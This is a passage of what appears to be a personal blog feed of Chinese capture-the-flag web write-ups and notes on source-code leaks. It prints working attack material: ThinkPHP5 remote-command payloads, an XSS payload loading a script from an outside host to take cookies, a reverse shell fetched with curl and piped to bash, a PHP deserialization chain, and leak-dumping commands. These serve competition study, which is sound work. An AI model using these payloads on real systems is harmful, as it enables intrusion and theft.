class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//无参RCE</span></span><br><span class="line"><span class="comment">//localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="comment">//scandir() 列出 images 目录中的文件和目录。</span></span><br><span class="line"><span class="comment">//readfile() 输出一个文件。</span></span><br><span class="line"><span class="comment">//current() 返回数组中的当前单元, 默认取第一个值。</span></span><br><span class="line"><span class="comment">//pos() current() 的别名。</span></span><br><span class="line"><span class="comment">//next() 函数将内部指针指向数组中的下一个元素，并输出。</span></span><br><span class="line"><span class="comment">//array_reverse()以相反的元素顺序返回数组。</span></span><br><span class="line"><span class="comment">//highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-EASY-WEB1&quot;&gt;&lt;a href=&quot;#0x01-EASY-WEB1&quot; class=&quot;headerlink&quot; title=&quot;0x01:EASY_WEB1&quot;&gt;&lt;/a&gt;0x01:EASY_WEB1&lt;/h3&gt;
    
    </summary>
    
    
    
      <category term="xm" scheme="http://yoursite.com/tags/xm/"/>
    
  </entry>
  
  <entry>
    <title>BJD2MRCTF</title>
    <link href="http://yoursite.com/2020/03/29/BJD2MRCTF/"/>
    <id>http://yoursite.com/2020/03/29/BJD2MRCTF/</id>
    <published>2020-03-29T05:24:57.000Z</published>
    <updated>2020-05-08T10:01:20.496Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MR"><a href="#MR" class="headerlink" title="MR"></a>MR</h2><a id="more"></a><h4 id="0X01-套娃"><a href="#0X01-套娃" class="headerlink" title="0X01: 套娃"></a>0X01: 套娃</h4><p>访问题目地址，页面没有什么有用的信息，查看网页源码，找到信息</p><img src="/2020/03/29/BJD2MRCTF/MR1.png" class="" title="examplename"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span><span class="comment">//这里相当于substr_count($query, '_') === 0 &amp;&amp; substr_count($query, '%5f') == 0</span></span><br><span class="line">这里坑可能是出题人不小心没有打上对于$query传值的方式，后来去百度的时候发现是有一个变量$q_w_q用_GET来传值的，这里对<span class="string">'_'</span>进行了限制，可以用php的特性用.来替代</span><br><span class="line">($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>])<span class="comment">//这里可以用%0a绕过</span></span><br><span class="line"> payload：?b.u.p.t=<span class="number">23333</span>%<span class="number">0</span>a&amp;q.w.q=ls</span><br></pre></td></tr></table></figure><p>爆出下一步路径</p><img src="/2020/03/29/BJD2MRCTF/MR2.png" class="" title="examplename"><p>访问，暂时没有有用的信息，还是查看源码，发现一段jsfuck加密的密文，解密：post me Merak</p><p>用burp来进行post传Merak，爆出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//直接说一下构造payload的思路</span></span><br><span class="line"><span class="number">1.</span>ip===<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>构造伪IP地址，刚开始想到的是X-Forwarded-<span class="keyword">For</span>,发现不行，想到了之前比赛收集的类似的伪构造，client-IP可用</span><br><span class="line"><span class="number">2.</span>file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> 用php伪协议php:<span class="comment">//input可以post数据</span></span><br><span class="line"><span class="number">3.</span>change($_GET[<span class="string">'file'</span>])，我们最后肯定是要读取flag.php的，根据给的加密方式反向解密，推算出$v为fj]a&amp;f\b，在进行base64加密，这里要注意要在本地base64加密，网上的加密有点问题</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/MR3.png" class="" title="examplename"><h2 id="BJD"><a href="#BJD" class="headerlink" title="BJD"></a>BJD</h2><h4 id="0X01-old-hacker"><a href="#0X01-old-hacker" class="headerlink" title="0X01:old hacker"></a>0X01:old hacker</h4><img src="/2020/03/29/BJD2MRCTF/old1.png" class="" title="examplename"><p>可以看到提示是thinkphp5的，用exp测试一下，利用报错收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/old2.png" class="" title="examplename"><p>是thinkphp5.2.23版本的，去找一下有关版本的漏洞，找到了可以利用的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="string">'id'</span></span><br></pre></td></tr></table></figure><p>id是可以控制的，可以直接读取根目录下的flag</p><h4 id="0X02：XSS"><a href="#0X02：XSS" class="headerlink" title="0X02：XSS"></a>0X02：XSS</h4><p>这道题用到的是php可用的反序列化原生类，以下是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>题目扫一遍发现有git泄露，用Githack拿到源码</p><img src="/2020/03/29/BJD2MRCTF/xss1.png" class="" title="examplename"><p>用上面的方式生成序列化数据进行测试，成功弹窗</p><img src="/2020/03/29/BJD2MRCTF/xss2.png" class="" title="examplename"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script src='http://xss.fbisb.com/xss.php?do=login'&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过上面的运行结果作为payload打，在cookie里可以找到flag</p><h4 id="0X03-Duangshell"><a href="#0X03-Duangshell" class="headerlink" title="0X03:Duangshell"></a>0X03:Duangshell</h4><p>打开题目有提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">how can i give you source code? .swp?!</span><br></pre></td></tr></table></figure><p>访问/.index.php.swp得到源码，用<code>vim -r index.php</code>恢复源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post一个girl_friend然后绕过一些正则比配之后就<code>exec()</code>，<code>exec()</code>和<code>system()</code>不同，<code>exec()</code>无回显，所以要考虑反弹shell，这里curl没有被ban掉</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在web服务目录下创建shell.txt文件，ip和port自己改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post数据</span><br><span class="line">girl_friend=curl http:<span class="comment">//174.1.150.238/shell.txt|bash</span></span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/shell.png" class="" title="examplename"><p>可以看到应该是要自己找flag，用linux命令 find/-name flag，成功找到</p><img src="/2020/03/29/BJD2MRCTF/shell1.png" class="" title="examplename"><h4 id="0X04：ezpop-看wp复现的"><a href="#0X04：ezpop-看wp复现的" class="headerlink" title="0X04：ezpop(看wp复现的)"></a>0X04：ezpop(看wp复现的)</h4><p>打开题目网址，拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据Y1ing师傅的wp（附上链接：https:<span class="comment">//www.gem-love.com/ctf/2184.html#Ezpop）</span></span><br><span class="line"><span class="number">1.</span>__wakeup()方法通过preg_match()将<span class="keyword">$this</span>-&gt;source做字符串比较，如果<span class="keyword">$this</span>-&gt;source是Show类，就调用了__toString()方法；</span><br><span class="line"><span class="number">2.</span>__toString()访问了str的source属性，str是Test类，不存在source属性，就调用了Test类的__get()魔术方法；</span><br><span class="line"><span class="number">3.</span>__get()方法将p作为函数使用，p实例化为Modify类，就调用了Modifier的__invoke()方法；</span><br><span class="line"><span class="number">4.</span>__invoke()调用了append()方法，包含$value，若将$value为伪协议，则可读flag.php源码</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$r = <span class="keyword">new</span> Modifer();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p=$r;</span><br><span class="line">$s-&gt;str=$t;</span><br><span class="line">$s-&gt;source=$s;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MR&quot;&gt;&lt;a href=&quot;#MR&quot; class=&quot;headerlink&quot; title=&quot;MR&quot;&gt;&lt;/a&gt;MR&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="BJD2&amp;MRCTF" scheme="http://yoursite.com/tags/BJD2-MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>信息泄露</title>
    <link href="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2020-03-14T03:37:03.000Z</published>
    <updated>2020-03-14T13:29:08.292Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01：-hg源码泄漏"><a href="#0x01：-hg源码泄漏" class="headerlink" title="0x01：.hg源码泄漏 "></a><strong>0x01：.hg源码泄漏</strong> <a id="more"></a></h4><p>漏洞成因：hg init 的时候会生成.hg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><p>漏洞利用:dvcs-ripper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02: .git源码泄漏"></a>0x02: .git源码泄漏</h4><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>漏洞利用:GitHack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x03-DS-Store文件泄漏"><a href="#0x03-DS-Store文件泄漏" class="headerlink" title="0x03:  .DS_Store文件泄漏"></a>0x03:  .DS_Store文件泄漏</h4><p>漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store,被发现后，获取敏感信息.</p><p>漏洞利用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure><p>工具:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure><h4 id="0x04-网站备份压缩文件"><a href="#0x04-网站备份压缩文件" class="headerlink" title="0x04:网站备份压缩文件"></a>0x04:网站备份压缩文件</h4><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>漏洞成因：</p><ul><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ul><p>漏洞测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h4 id="0x05-SVN文件泄漏"><a href="#0x05-SVN文件泄漏" class="headerlink" title="0x05:SVN文件泄漏"></a>0x05:SVN文件泄漏</h4><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x06：WEB-INF-web-xml泄漏"><a href="#0x06：WEB-INF-web-xml泄漏" class="headerlink" title="0x06：WEB-INF/web.xml泄漏"></a>0x06：WEB-INF/web.xml泄漏</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要文件或目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</span><br></pre></td></tr></table></figure><p>0x07：CVS泄漏</p><p>漏洞利用:</p><p>取回源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bk 